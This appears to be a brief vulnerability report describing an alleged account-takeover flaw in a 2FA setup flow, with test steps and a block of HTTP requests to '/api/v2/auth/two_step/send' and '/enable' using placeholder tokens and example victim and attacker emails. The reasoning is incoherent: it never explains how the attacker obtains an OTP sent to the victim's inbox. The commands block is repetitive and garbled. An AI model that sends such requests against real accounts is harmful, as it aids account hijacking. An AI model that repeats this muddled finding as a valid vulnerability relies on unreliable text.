## Use case

The vulnerability exists in the 2FA setup flow where the application allows an attacker to send an OTP to any email address without verifying ownership, leading to account takeover.

## Steps to test

1. Register an account using the victim's email address without verification.
2. Use the endpoint POST /api/v2/auth/two_step/send with the victim's email to request an OTP.
3. Capture the OTP sent to the victim's email.
4. Use the endpoint POST /api/v2/auth/two_step/enable with the attacker's email and the captured OTP to enable 2FA.

## Commands

```text
POST /api/v2/auth/two_step/send Authorization: Bearer <my_token> { "email": "victim@example.com" }
POST /api/v2/auth/two_step/enable Authorization: Bearer <my_token> { "email": "attacker@example.com", "otp": "<captured_otp>" }
POST /api/v2/auth/two_step/send
POST /api/v2/auth/two_step/enable
POST /api/v2/auth/two_step/send
Authorization: Bearer <my_token>
{
"email": "Attacker@example.com"
}
POST /api/v2/auth/two_step/enable
Authorization: Bearer <my_token>
{
"email": "Attacker@example.com",
"otp": "123456"
}
POST /api/v2/auth/two_step/send
POST /api/v2/auth/two_step/enable
```
